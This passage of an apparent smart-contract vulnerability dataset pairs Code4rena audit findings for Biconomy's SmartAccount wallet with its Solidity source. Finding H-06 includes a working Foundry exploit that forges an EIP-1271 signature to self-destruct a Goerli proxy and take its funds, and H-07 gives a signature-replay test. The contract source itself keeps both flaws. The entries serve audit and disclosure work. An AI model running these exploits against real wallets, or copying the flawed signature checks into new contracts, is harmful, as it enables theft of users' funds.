---------\n            }\n        }\n\n    function checkSignatures(\n            bytes32 dataHash,\n            bytes memory data,\n            bytes memory signatures\n        ) public view virtual {\n    ----------\n            if(v == 0) {\n    ----------\n                _signer = address(uint160(uint256(r)));\n    ----------\n                    require(uint256(s) = uint256(1) * 65, \"BSA021\");\n    ----------\n                    require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n    -----------\n                    assembly {\n                        contractSignatureLen := mload(add(add(signatures, s), 0x20))\n                    }\n                    require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n    -----------\n                    require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n    -----------\n        }\n\ncheckSignature DOES NOT Validate that the _signer or caller is the owner of the contract.\n\nA hacker can craft a signature that bypasses the signature structure requirements and sets a hacker controlled _signer that always return EIP1271_MAGIC_VALUE from the isValidSignature function.\n\nAs isValidSignature returns EIP1271_MAGIC_VALUE and passed the requirements, the function checkSignatures returns gracefully and the transaction execution will continue. Arbitrary transactions can be set by the hacker.\n\nImpact #1 Self destruct and steal all funds\n\nConsider the following scenario:\n\n1.  Hacker creates FakeSigner that always returns EIP1271_MAGIC_VALUE\n2.  Hacker creates SelfDestructingContract that selfdestructs when called\n3.  Hacker calls the smart wallets execTransaction function\n    1.  The transaction set will delegatecall to the SelfDestructingContract function to selfdestruct\n    2.  The signature is crafted to validate against hacker controlled FakeSigner that always returns EIP1271_MAGIC_VALUE\n4.  Proxy contract is destroyed\n    1.  Hacker received all funds that were in the wallet\n\nImpact #2 Update implementation and lock out EOA\n\n1.  Hacker creates FakeSigner that always returns EIP1271_MAGIC_VALUE\n2.  Hacker creates MaliciousImplementation that is fully controlled ONLY by the hacker\n3.  Hacker calls the smart wallets execTransaction function\n    1.  The transaction set will call to the the contracts updateImplementation function to update the implementation to MaliciousImplementation. This is possible because updateImplementation permits being called from address(this)\n    2.  The signature is crafted to validate against hacker controlled FakeSigner that always returns EIP1271_MAGIC_VALUE\n4.  Implementation was updated to MaliciousImplementation\n    1.  Hacker transfers all native and ERC20 tokens to himself\n    2.  Hacker unstakes EOA funds from protocols\n    3.  Hacker might try to ransom the protocol/EOAs to return to previous implementation\n5.  Proxy cannot be redeployed for the existing EOA\n\nFoundry POC\n\nThe POC will demonstrate impact #1. It will show that the proxy does not exist after the attack and EOAs cannot interact with the wallet.\n\nThe POC was built using the Foundry framework which allowed me to validate the vulnerability against the state of deployed contract on goerli (Without interacting with them directly). This was approved by the sponsor.\n\nThe POC use a smart wallet proxy contract that is deployed on goerli chain:<br\nproxy: 0x11dc228AB5BA253Acb58245E10ff129a6f281b09\n\nYou will need to install a foundry. Please follow these instruction for the setup: <https://book.getfoundry.sh/getting-started/installation\n\nAfter installing, create a workdir by issuing the command: forge init --no-commit\n\nCreate the following file in test/DestroyWalletAndStealFunds.t.sol:\n\n    // SPDX-License-Identifier: UNLICENSED\n    pragma solidity ^0.8.13;\n\n    import \"forge-std/Test.sol\";\n\n    contract Enum {\n        enum Operation {Call, DelegateCall}\n    }\n    interface SmartAccount {\n        function execTransaction(\n            Transaction memory _tx,\n            uint256 batchId,\n            FeeRefund memory refundInfo,\n            bytes memory signatures\n        ) external payable returns (bool success); \n        function getNonce(uint256 batchId) external view returns (uint256);\n    }\n    struct Transaction {\n            address to;\n            uint256 value;\n            bytes data;\n            Enum.Operation operation;\n            uint256 targetTxGas;\n        }\n    struct FeeRefund {\n            uint256 baseGas;\n            uint256 gasPrice; //gasPrice or tokenGasPrice\n            uint256 tokenGasPriceFactor;\n            address gasToken;\n            address payable refundReceiver;\n        }\n    contract FakeSigner {\n        bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;\n\n        // Always return valid EIP1271_MAGIC_VALUE\n        function isValidSignature(bytes memory data, bytes memory contractSignature) external returns (bytes4) {\n            return EIP1271_MAGIC_VALUE;\n        }\n    }\n    contract SelfDestructingContract {\n        // All this does is self destruct and send funds to \"to\"\n        function selfDestruct(address to) external {\n            selfdestruct(payable(to));\n        }\n    }\n\n    contract DestroyWalletAndStealFunds is Test {\n        SmartAccount proxySmartAccount = SmartAccount(0x11dc228AB5BA253Acb58245E10ff129a6f281b09);\n        address hacker = vm.addr(0x1337);\n        SelfDestructingContract sdc;\n        FakeSigner fs;\n        function setUp() public {\n            // Create self destruct contract\n            sdc = new SelfDestructingContract();\n            // Create fake signer\n            fs = new FakeSigner();\n\n            // Impersonate hacker\n            vm.startPrank(hacker);\n            // Create the calldata to call the selfDestruct function of SelfDestructingContract and send funds to hacker \n            bytes memory data = abi.encodeWithSelector(sdc.selfDestruct.selector, hacker);\n            // Create transaction specifing SelfDestructingContract as target and as a delegate call\n            Transaction memory transaction = Transaction(address(sdc), 0, data, Enum.Operation.DelegateCall, 1000000);\n            // Create FeeRefund\n            FeeRefund memory fr = FeeRefund(100, 100, 100, hacker, payable(hacker));\n\n            bytes32 fakeSignerPadded = bytes32(uint256(uint160(address(fs))));\n            // Add fake signature (r,s,v) to pass all requirments.\n            // v=0 to indicate eip-1271 signer \"fakeSignerPadded\" which will always return true\n            bytes memory signatures = abi.encodePacked(fakeSignerPadded, bytes32(uint256(65)),uint8(0), bytes32(0x0));\n            // Call execTransaction with eip-1271 signer to delegatecall to selfdestruct of the proxy contract.\n            proxySmartAccount.execTransaction(transaction, 0, fr, signatures);\n            vm.stopPrank();\n        }\n\n        function testProxyDoesNotExist() public {\n            uint size;\n            // Validate that bytecode size of the proxy contract is 0 becuase of self destruct \n            address proxy = address(proxySmartAccount);\n            assembly {\n              size := extcodesize(proxy)\n            }\n            assertEq(size,0);\n        }\n\n        function testRevertWhenCallingWalletThroughProxy() public {\n            // Revert when trying to call a function in the proxy \n            proxySmartAccount.getNonce(0);\n        }\n    }\n\nTo run the POC and validate that the proxy does not exist after destruction:\n\n    forge test -m testProxyDoesNotExist -v --fork-url=\"<GOERLI FORK RPC\"\n\nExpected output:\n\n    Running 1 test for test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds\n    PASS] testProxyDoesNotExist() (gas: 4976)\n    Test result: ok. 1 passed; 0 failed; finished in 4.51s\n\nTo run the POC and validate that the EOA cannot interact with the wallet after destruction:\n\n    forge test -m testRevertWhenCallingWalletThroughProxy -v --fork-url=\"<GOERLI FORK RPC\"\n\nExpected output:\n\n    Failing tests:\n    Encountered 1 failing test in test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds\n    FAIL. Reason: EvmError: Revert] testRevertWhenCallingWalletThroughProxy() (gas: 5092)\n\n\nFoundry, VS Code\n\n",
                "Repair": "\nThe protocol should validate before calling isValidSignature that _signer is owner.\n\nlivingrockrises (Biconomy) confirmed(https://github.com/code-423n4/2023-01-biconomy-findings/issues/175#issuecomment-1397655516)\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-07",
                "Location": [
                    "batchId",
                    "nonces[batchId]"
                ],
                "Type": " Replay attack (EIP712 signed transaction)",
                "Description": "*Submitted by Tointer(https://github.com/code-423n4/2023-01-biconomy-findings/issues/36), also found by V_B(https://github.com/code-423n4/2023-01-biconomy-findings/issues/485), Tricko(https://github.com/code-423n4/2023-01-biconomy-findings/issues/424), Haipls(https://github.com/code-423n4/2023-01-biconomy-findings/issues/371), Koolex(https://github.com/code-423n4/2023-01-biconomy-findings/issues/316), peakbolt(https://github.com/code-423n4/2023-01-biconomy-findings/issues/305), 0xdeadbeef0x(https://github.com/code-423n4/2023-01-biconomy-findings/issues/235), PwnedNoMore(https://github.com/code-423n4/2023-01-biconomy-findings/issues/210), romand(https://github.com/code-423n4/2023-01-biconomy-findings/issues/166), ro(https://github.com/code-423n4/2023-01-biconomy-findings/issues/61), csanuragjain(https://github.com/code-423n4/2023-01-biconomy-findings/issues/48), HE1M(https://github.com/code-423n4/2023-01-biconomy-findings/issues/43), taek(https://github.com/code-423n4/2023-01-biconomy-findings/issues/38), and orion(https://github.com/code-423n4/2023-01-biconomy-findings/issues/6)*\n\ncontracts/smart-contract-wallet/SmartAccount.sol#L212(https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L212)<br\n\nSigned transaction can be replayed. First user transaction can always be replayed any amount of times. With non-first transactions attack surface is reduced but never disappears.\n\n\nContract checks nonces[batchId] but not batchId itself, so we could reuse other batches nounces. If before transaction we have n batches with the same nonce as transaction batch, then transaction can be replayed n times. Since there are 2^256 batchIds with nonce = 0, first transaction in any batch can be replayed as much times as attacker needs.\n\n\nInsert this test in testGroup1.ts right after Should set the correct states on proxy test:\n\n    it(\"replay EIP712 sign transaction\", async function () {\n      await token\n      .connect(accounts[0])\n      .transfer(userSCW.address, ethers.utils.parseEther(\"100\"));\n\n    const safeTx: SafeTransaction = buildSafeTransaction({\n      to: token.address,\n      data: encodeTransfer(charlie, ethers.utils.parseEther(\"10\").toString()),\n      nonce: await userSCW.getNonce(0),\n    });\n\n    const chainId = await userSCW.getChainId();\n    const { signer, data } = await safeSignTypedData(\n      accounts[0],\n      userSCW,\n      safeTx,\n      chainId\n    );\n\n    const transaction: Transaction = {\n      to: safeTx.to,\n      value: safeTx.value,\n      data: safeTx.data,\n      operation: safeTx.operation,\n      targetTxGas: safeTx.targetTxGas,\n    };\n    const refundInfo: FeeRefund = {\n      baseGas: safeTx.baseGas,\n      gasPrice: safeTx.gasPrice,\n      tokenGasPriceFactor: safeTx.tokenGasPriceFactor,\n      gasToken: safeTx.gasToken,\n      refundReceiver: safeTx.refundReceiver,\n    };\n\n    let signature = \"0x\";\n    signature += data.slice(2);\n\n\n    await expect(\n      userSCW.connect(accounts[2]).execTransaction(\n        transaction,\n        0, // batchId\n        refundInfo,\n        signature\n      )\n    ).to.emit(userSCW, \"ExecutionSuccess\");\n\n    //contract checks nonces[batchId] but not batchId itself\n    //so we can change batchId to the one that have the same nonce\n    //this would replay transaction\n    await expect(\n      userSCW.connect(accounts[2]).execTransaction(\n        transaction,\n        1, // changed batchId\n        refundInfo,\n        signature\n      )\n    ).to.emit(userSCW, \"ExecutionSuccess\");\n\n    //charlie would have 20 tokens after this\n    expect(await token.balanceOf(charlie)).to.equal(\n      ethers.utils.parseEther(\"20\")\n    );\n    });\n\n",
                "Repair": "\nAdd batchId to the hash calculation of the transaction in encodeTransactionData function.\n\nlivingrockrises (Biconomy) confirmed(https://github.com/code-423n4/2023-01-biconomy-findings/issues/36#issuecomment-1404370864)\n\n\n\n*\n \n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.12;\n\n/**\n * @title Proxy // This is the user's wallet\n * @notice Basic proxy that delegates all calls to a fixed implementing contract.\n */\ncontract Proxy {\n\n    /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x37722d148fb373b961a84120b6c8d209709b45377878a466db32bbc40d95af26;\n\n    event Received(uint indexed value, address indexed sender, bytes data);\n\n    constructor(address _implementation) {\n         assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n         assembly {\n             sstore(_IMPLEMENTATION_SLOT,_implementation) \n         }\n    }\n\n    fallback() external payable {\n        address target;\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            target := sload(_IMPLEMENTATION_SLOT)\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), target, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 {revert(0, returndatasize())}\n            default {return (0, returndatasize())}\n        }\n    }\n\n    receive() external payable {\n        emit Received(msg.value, msg.sender, \"\");\n    }\n\n}\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.12;\n\nimport \"./libs/LibAddress.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"./BaseSmartAccount.sol\";\nimport \"./common/Singleton.sol\";\nimport \"./base/ModuleManager.sol\";\nimport \"./base/FallbackManager.sol\";\nimport \"./common/SignatureDecoder.sol\";\nimport \"./common/SecuredTokenTransfer.sol\";\nimport \"./interfaces/ISignatureValidator.sol\";\nimport \"./interfaces/IERC165.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\ncontract SmartAccount is \n     Singleton,\n     BaseSmartAccount,\n     IERC165,\n     ModuleManager,\n     SignatureDecoder,\n     SecuredTokenTransfer,\n     ISignatureValidatorConstants,\n     FallbackManager,\n     Initializable,\n     ReentrancyGuardUpgradeable\n    {\n    using ECDSA for bytes32;\n    using LibAddress for address;\n\n    // Storage\n\n    // Version\n    string public constant VERSION = \"1.0.2\"; // using AA 0.3.0\n\n    // Domain Seperators\n    // keccak256(\n    //     \"EIP712Domain(uint256 chainId,address verifyingContract)\"\n    // );\n    bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n\n    // review? if rename wallet to account is must\n    // keccak256(\n    //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n    // );\n    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\n    // Owner storage\n    address public owner;\n\n    // uint96 private _nonce; //changed to 2D nonce below\n    // @notice there is no _nonce \n    mapping(uint256 => uint256) public nonces;\n\n    // AA storage\n    // review\n    IEntryPoint private _entryPoint;\n\n    \n    // Events\n    // EOA + Version tracking\n    event ImplementationUpdated(address _scw, string version, address newImplementation);\n    event EntryPointChanged(address oldEntryPoint, address newEntryPoint);\n    event EOAChanged(address indexed _scw, address indexed _oldEOA, address indexed _newEOA);\n    event WalletHandlePayment(bytes32 txHash, uint256 payment);\n    // nice to have\n    // event SmartAccountInitialized(IEntryPoint indexed entryPoint, address indexed owner);\n\n    // modifiers\n    // onlyOwner\n    /**\n     * @notice Throws if the sender is not an the owner.\n     */\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n        _;\n    }\n\n    // onlyOwner OR self\n    modifier mixedAuth {\n        require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n        _;\n   }\n\n   // only from EntryPoint\n   modifier onlyEntryPoint {\n        require(msg.sender == address(entryPoint()), \"wallet: not from EntryPoint\");\n        _; \n   }\n\n   function nonce() public view virtual override returns (uint256) {\n        return nonces[0];\n    }\n\n    function nonce(uint256 _batchId) public view virtual override returns (uint256) {\n        return nonces[_batchId];\n    }\n\n    function entryPoint() public view virtual override returns (IEntryPoint) {\n        return _entryPoint;\n    }\n\n    // @notice authorized modifier (onlySelf) is already inherited\n\n    // Setters\n\n    function setOwner(address _newOwner) external mixedAuth {\n        require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n        address oldOwner = owner;\n        owner = _newOwner;\n        emit EOAChanged(address(this), oldOwner, _newOwner);\n    }\n\n    /**\n     * @notice Updates the implementation of the base wallet\n     * @param _implementation New wallet implementation\n     */\n    function updateImplementation(address _implementation) external mixedAuth {\n        require(_implementation.isContract(), \"INVALID_IMPLEMENTATION\");\n        _setImplementation(_implementation);\n        // EOA + Version tracking\n        emit ImplementationUpdated(address(this), VERSION, _implementation);\n    }\n\n    function updateEntryPoint(address _newEntryPoint) external mixedAuth {\n        require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n        emit EntryPointChanged(address(_entryPoint), _newEntryPoint);\n        _entryPoint = IEntryPoint(payable(_newEntryPoint));\n    }\n\n    // Getters\n\n    function domainSeparator() public view returns (bytes32) {\n        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\n    }\n\n    /// @dev Returns the chain id used by this contract.\n    function getChainId() public view returns (uint256) {\n        uint256 id;\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            id := chainid()\n        }\n        return id;\n    }\n\n    //@review getNonce specific to EntryPoint requirements\n    /**\n     * @dev returns a value from the nonces 2d mapping\n     * @param batchId : the key of the user's batch being queried\n     * @return nonce : the number of transaction made within said batch\n     */\n    function getNonce(uint256 batchId)\n    public view\n    returns (uint256) {\n        return nonces[batchId];\n    }\n\n\n    // init\n    // Initialize / Setup\n    // Used to setup\n    // i. owner ii. entry point address iii. handler\n    function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n        require(owner == address(0), \"Already initialized\");\n        require(address(_entryPoint) == address(0), \"Already initialized\");\n        require(_owner != address(0),\"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        owner = _owner;\n        _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n\n    /**\n     * @dev Returns the largest of two numbers.\n     */\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a >= b ? a : b;\n    }\n\n    // Gnosis style transaction with optional repay in native tokens OR ERC20 \n    /// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction.\n    /// Note: The fees are always transferred, even if the user transaction fails.\n    /// @param _tx Wallet transaction \n    /// @param batchId batchId key for 2D nonces\n    /// @param refundInfo Required information for gas refunds\n    /// @param signatures Packed signature data ({bytes32 r}{bytes32 s}{uint8 v})\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures\n    ) public payable virtual override returns (bool success) {\n        // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n        //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n        uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n        //console.log(\"init %s\", 21000 + msg.data.length * 8);\n        bytes32 txHash;\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            bytes memory txHashData =\n                encodeTransactionData(\n                    // Transaction info\n                    _tx,\n                    // Payment info\n                    refundInfo,\n                    // Signature info\n                    nonces[batchId]\n                );\n            // Increase nonce and execute transaction.\n            // Default space aka batchId is 0\n            nonces[batchId]++;\n            txHash = keccak256(txHashData);\n            checkSignatures(txHash, txHashData, signatures);\n        }\n\n\n        // We require some gas to emit the events (at least 2500) after the execution and some to perform code until the execution (500)\n        // We also include the 1/64 in the check that is not send along with a call to counteract potential shortings because of EIP-150\n        require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            // If the gasPrice is 0 we assume that nearly all available gas can be used (it is always more than targetTxGas)\n            // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas\n            success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);\n            // If no targetTxGas and no gasPrice was set (e.g. both are 0), then the internal tx is required to be successful\n            // This makes it possible to use `estimateGas` without issues, as it searches for the minimum gas where the tx doesn't revert\n            require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\n            // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls\n            uint256 payment = 0;\n            // uint256 extraGas;\n            if (refundInfo.gasPrice > 0) {\n                //console.log(\"sent %s\", startGas - gasleft());\n                // extraGas = gasleft();\n                payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n                emit WalletHandlePayment(txHash, payment);\n            }\n            // extraGas = extraGas - gasleft();\n            //console.log(\"extra gas %s \", extraGas);\n        }\n    }\n\n    function handlePayment(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) private nonReentrant returns (uint256 payment) {\n        // uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        // uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hp %s\", requiredGas);\n    }\n\n    function handlePaymentRevert(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) external returns (uint256 payment) {\n        uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hpr %s\", requiredGas);\n        // Convert response to string and return via error message\n        revert(string(abi.encodePacked(requiredGas)));\n    }\n\n    /**\n     * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise.\n     * @param dataHash Hash of the data (could be either a message hash or transaction hash)\n     * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash.\n     */\n    function checkSignatures(\n        bytes32 dataHash,\n        bytes memory data,\n        bytes memory signatures\n    ) public view virtual {\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n        uint256 i = 0;\n        address _signer;\n        (v, r, s) = signatureSplit(signatures, i);\n        //review\n        if(v == 0) {\n            // If v is 0 then it is a contract signature\n            // When handling contract signatures the address of the contract is encoded into r\n            _signer = address(uint160(uint256(r)));\n\n            // Check that signature data pointer (s) is not pointing inside the static part of the signatures bytes\n                // This check is not completely accurate, since it is possible that more signatures than the threshold are send.\n                // Here we only check that the pointer is not pointing inside the part that is being processed\n                require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n\n                // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)\n                require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n\n                // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length\n                uint256 contractSignatureLen;\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    contractSignatureLen := mload(add(add(signatures, s), 0x20))\n                }\n                require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n\n                // Check signature\n                bytes memory contractSignature;\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    // The signature data for contract signatures is appended to the concatenated signatures and the offset is stored in s\n                    contractSignature := add(add(signatures, s), 0x20)\n                }\n                require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n        }\n        else if(v > 30) {\n            // If v > 30 then default va (27,28) has been adjusted for eth_sign flow\n            // To support eth_sign and similar we adjust v and hash the messageHash with the Ethereum message prefix before applying ecrecover\n            _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\n            require(_signer == owner, \"INVALID_SIGNATURE\");\n        } else {\n            _signer = ecrecover(dataHash, v, r, s);\n            require(_signer == owner, \"INVALID_SIGNATURE\");\n        }\n    }\n\n    /// @dev Allows to estimate a transaction.\n    ///      This method is only meant for estimation purpose, therefore the call will always revert and encode the result in the revert data.\n    ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`\n    /// @param to Destination address of Safe transaction.\n    /// @param value Ether value of transaction.\n    /// @param data Data payload of transaction.\n    /// @param operation Operation type of transaction.\n    /// @return Estimate without refunds and overhead fees (base transaction and payload data gas costs).\n    function requiredTxGas(\n        address to,\n        uint256 value,\n        bytes calldata data,\n        Enum.Operation operation\n    ) external returns (uint256) {\n        uint256 startGas = gasleft();\n        // We don't provide an error message here, as we use it to return the estimate\n        require(execute(to, value, data, operation, gasleft()));\n        uint256 requiredGas = startGas - gasleft();\n        // Convert response to string and return via error message\n        revert(string(abi.encodePacked(requiredGas)));\n    }\n\n    /// @dev Returns hash to be signed by owner.\n    /// @param to Destination address.\n    /// @param value Ether value.\n    /// @param data Data payload.\n    /// @param operation Operation type.\n    /// @param targetTxGas Fas that should be used for the safe transaction.\n    /// @param baseGas Gas costs for data used to trigger the safe transaction.\n    /// @param gasPrice Maximum gas price that should be used for this transaction.\n    /// @param gasToken Token address (or 0 if ETH) that is used for the payment.\n    /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).\n    /// @param _nonce Transaction nonce.\n    /// @return Transaction hash.\n    function getTransactionHash(\n        address to,\n        uint256 value,\n        bytes calldata data,\n        Enum.Operation operation,\n        uint256 targetTxGas,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver,\n        uint256 _nonce\n    ) public view returns (bytes32) {\n        Transaction memory _tx = Transaction({\n            to: to,\n            value: value,\n            data: data,\n            operation: operation,\n            targetTxGas: targetTxGas\n        });\n        FeeRefund memory refundInfo = FeeRefund({\n            baseGas: baseGas,\n            gasPrice: gasPrice,\n            tokenGasPriceFactor: tokenGasPriceFactor,\n            gasToken: gasToken,\n            refundReceiver: refundReceiver\n        });\n        return keccak256(encodeTransactionData(_tx, refundInfo, _nonce));\n    }\n\n    /// @dev Returns the bytes that are hashed to be signed by owner.\n    /// @param _tx Wallet transaction \n    /// @param refundInfo Required information for gas refunds\n    /// @param _nonce Transaction nonce.\n    /// @return Transaction hash bytes.\n    function encodeTransactionData(\n        Transaction memory _tx,\n        FeeRefund memory refundInfo,\n        uint256 _nonce\n    ) public view returns (bytes memory) {\n        bytes32 safeTxHash =\n            keccak256(\n                abi.encode(\n                    ACCOUNT_TX_TYPEHASH,\n                    _tx.to,\n                    _tx.value,\n                    keccak256(_tx.data),\n                    _tx.operation,\n                    _tx.targetTxGas,\n                    refundInfo.baseGas,\n                    refundInfo.gasPrice,\n                    refundInfo.gasToken,\n                    refundInfo.refundReceiver,\n                    _nonce\n                )\n            );\n        return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);\n    }\n\n    // Extra Utils \n    function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n        require(dest != address(0), \"this action will burn your funds\");\n        (bool success,) = dest.call{value:amount}(\"\");\n        require(success,\"transfer failed\");\n    }\n\n    function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n        IERC20 tokenContract = IERC20(token);\n        SafeERC20.safeTransfer(tokenContract, dest, amount);\n    }\n\n    function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n        _requireFromEntryPointOrOwner();\n        _call(dest, value, func);\n    }\n\n    function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n        _requireFromEntryPointOrOwner();\n        require(dest.length == func.length, \"wrong array lengths\");\n        for (uint i = 0; i < dest.length;) {\n            _call(dest[i], 0, func[i]);\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    // AA implementation\n    function _call(address target, uint256 value, bytes memory data) internal {\n        (bool success, bytes memory result) = target.call{value : value}(data);\n        if (!success) {\n            assembly {\n                revert(add(result, 32), mload(result))\n            }\n        }\n    }\n    \n    //called by entryPoint, only after validateUserOp succeeded.\n    //@review\n    //Method is updated to instruct delegate call and emit regular events\n    function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n        success = execute(dest, value, func, operation, gasLimit);\n        require(success, \"Userop Failed\");\n    }\n\n    function _requireFromEntryPointOrOwner() internal view {\n        require(msg.sender == address(entryPoint()) || msg.sender == owner, \"account: not Owner or EntryPoint\");\n    }\n\n    /// implement template method of BaseAccount\n    // @notice Nonce space is locked to 0 for AA transactions\n    // userOp could have batchId as well\n    function _validateAndUpdateNonce(UserOperation calldata userOp) internal override {\n        require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\");\n    }\n\n    /// implement template method of BaseAccount\n    function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address)\n    internal override virtual returns (uint256 deadline) {\n        bytes32 hash = userOpHash.toEthSignedMessageHash();\n        //ignore signature mismatch of from==ZERO_ADDRESS (for eth_callUserOp validation purposes)\n        // solhint-disable-next-line avoid-tx-origin\n        require(owner == hash.recover(userOp.signature) || tx.origin == address(0), \"account: wrong signature\");\n        return 0;\n    }\n\n    /**\n     * check current account deposit in the entryPoint\n     */\n    function getDeposit() public view returns (uint256) {\n        return entryPoint().balanceOf(address(this));\n    }\n\n    /**\n     * deposit more funds for this account in the entryPoint\n     */\n    function addDeposit() public payable {\n\n        (bool req,) = address(entryPoint()).call{value : msg.value}(\"\");\n        